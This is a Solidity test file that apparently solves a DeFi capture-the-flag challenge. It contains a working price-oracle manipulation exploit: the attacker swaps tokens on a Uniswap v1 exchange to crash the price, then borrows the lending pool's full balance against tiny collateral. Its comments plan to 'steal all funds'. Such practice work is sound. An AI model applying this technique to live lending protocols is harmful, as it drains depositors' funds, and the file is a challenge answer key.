// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/OvercollateralizedFixture.sol";

contract OvercollateralizedTest is OvercollateralizedFixture {

    function setUp() public override {
        super.setUp();
    }

    function test_overcollateralized() public {

        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        /**
         * Code your exploit here
         */
        /*
            ---- We have to steal all funds ----
            The function _computeOraclePrice gets the price according to the balances of ether and DefiCtfToken in the uniswap exchange
            If we are able to change that balances from the exchangewe could get a smaller collateral required
            Then we will borrow all the pool balance and since our collateral is so small we won't return the loan
        */ 
        // Step 1: Swap all of our DefiCtfToken tokens for ETH on the Uniswap v1 exchange.
        // First we approve the exchange to get our tokens 
        // -1 in order to pass the assertGt(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE). If not it will be assertEq
        token.approve(exchange, ATTACKER_INITIAL_TOKEN_BALANCE - 1);
        // Then we swap
        // tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline)
        (bool success, bytes memory data) = exchange.call(abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)", 
            ATTACKER_INITIAL_TOKEN_BALANCE - 1, 
            1, // Matters?
            999 // Matters?
        ));
        require(success, "tokenToEthSwapInput failed");

        // Step 2: We need to check how much collateral we have to "pay"
        uint256 collateralRequired = pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);

        // Step 3: We borrow all the DefiCtfToken on the pool, since the price it's so cheap we won't return it
        pool.borrow{value: collateralRequired}(POOL_INITIAL_TOKEN_BALANCE);

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // The lending pool has no tokens left.
        assertEq(token.balanceOf(address(pool)), 0);
        // The attacker has all the tokens.
        assertGt(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
    }
}